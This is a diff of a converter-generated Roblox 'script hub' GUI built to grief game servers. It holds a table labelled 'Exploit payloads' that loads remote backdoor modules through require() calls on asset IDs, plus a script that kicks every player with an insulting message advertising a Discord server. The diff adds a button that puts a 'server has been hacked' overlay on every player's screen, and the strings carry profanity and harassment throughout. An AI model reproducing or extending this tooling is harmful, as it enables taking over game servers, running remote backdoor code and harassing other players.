@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 27 | Scripts: 3 | Modules: 0 | Tags: 0
+-- Instances: 28 | Scripts: 3 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
@@ -130,13 +130,14 @@ G2L["b"] = Instance.new("ScrollingFrame", G2L["3"]);
 G2L["b"]["Active"] = true;
 G2L["b"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
 G2L["b"]["BorderSizePixel"] = 0;
+G2L["b"]["CanvasPosition"] = Vector2.new(0, 296);
 G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 255);
 G2L["b"]["Name"] = [[ScriptHubFrame]];
 G2L["b"]["Size"] = UDim2.new(0, 104, 0, 296);
 G2L["b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["b"]["Position"] = UDim2.new(1, 0, 0, 0);
 G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b"]["ScrollBarThickness"] = 5;
+G2L["b"]["ScrollBarThickness"] = 10;
 
 
 -- StarterGui.ScreenGui.Frame.ScriptHubFrame.LocalScript
@@ -374,6 +375,22 @@ G2L["1b"]["Name"] = [[kickall]];
 G2L["1b"]["Position"] = UDim2.new(0.05769, 0, 0.15878, 0);
 
 
+-- StarterGui.ScreenGui.Frame.ScriptHubFrame.hackmessage
+G2L["1c"] = Instance.new("TextButton", G2L["b"]);
+G2L["1c"]["TextWrapped"] = true;
+G2L["1c"]["BorderSizePixel"] = 0;
+G2L["1c"]["TextSize"] = 14;
+G2L["1c"]["TextScaled"] = true;
+G2L["1c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["1c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1c"]["Size"] = UDim2.new(0, 92, 0, 31);
+G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c"]["Text"] = [[textlabel bottom right]];
+G2L["1c"]["Name"] = [[hackmessage]];
+G2L["1c"]["Position"] = UDim2.new(0.05769, 0, 0.15878, 0);
+
+
 -- StarterGui.ScreenGui.LocalScript
 local function C_2()
 local script = G2L["2"];
@@ -492,8 +509,9 @@ task.spawn(C_4);
 -- StarterGui.ScreenGui.Frame.ScriptHubFrame.LocalScript
 local function C_c()
 local script = G2L["c"];
-	local player = game.Players.LocalPlayer
-	local username = player.Name
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	local username = LocalPlayer.Name
 	
 	-- GUI hierarchy
 	local scriptHubFrame = script.Parent
@@ -501,16 +519,16 @@ local script = G2L["c"];
 	local textbox = mainFrame:FindFirstChild("TextBox")
 	
 	-- 🎶 Music settings
-	local musicId = "95156028272944" -- Replace with your desired audio ID
-	local playbackSpeed = 0.2    -- Adjust playback speed here
+	local musicId = "95156028272944"
+	local playbackSpeed = 0.2
 	
 	-- 🌌 Skybox settings
-	local skyboxId = "94667677722688" -- Replace with your desired decal ID
+	local skyboxId = "94667677722688"
 	
 	-- 🧱 Decal settings
-	local decalId = "94667677722688" -- Replace with your desired decal ID
+	local decalId = "94667677722688"
 	
-	-- Script buttons inside ScriptHubFrame
+	-- Exploit payloads
 	local buttons = {
 		c00lgui = 'require(14125553864):Fire("' .. username .. '","c00lkidd")',
 		polaria = 'require(123255432303221):Pload("' .. username .. '")',
@@ -588,6 +606,24 @@ local script = G2L["c"];
 		kickall = [[
 	for _, p in pairs(game.Players:GetPlayers()) do
 		p:Kick("you have been kicked by TLK88(team l0stk1dd88) you stupid fucking noob! join us today! disc invite: https://discord.gg/93xs9dAECK")
+	end
+	]],
+		hackmessage = [[
+	for _, player in pairs(game.Players:GetPlayers()) do
+		local gui = Instance.new("ScreenGui")
+		gui.Name = "TLK88Overlay"
+		gui.ResetOnSpawn = false
+		gui.Parent = player:WaitForChild("PlayerGui")
+	
+		local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(0, 400, 0, 50)
+		label.Position = UDim2.new(0, 10, 1, -60)
+		label.BackgroundTransparency = 1
+		label.TextColor3 = Color3.new(1, 1, 1)
+		label.TextScaled = true
+		label.Font = Enum.Font.SourceSansBold
+		label.Text = "this server has been hacked by TLK88 you fucking noobs! prepare for chaos!"
+		label.Parent = gui
 	end
 	]]
 	}
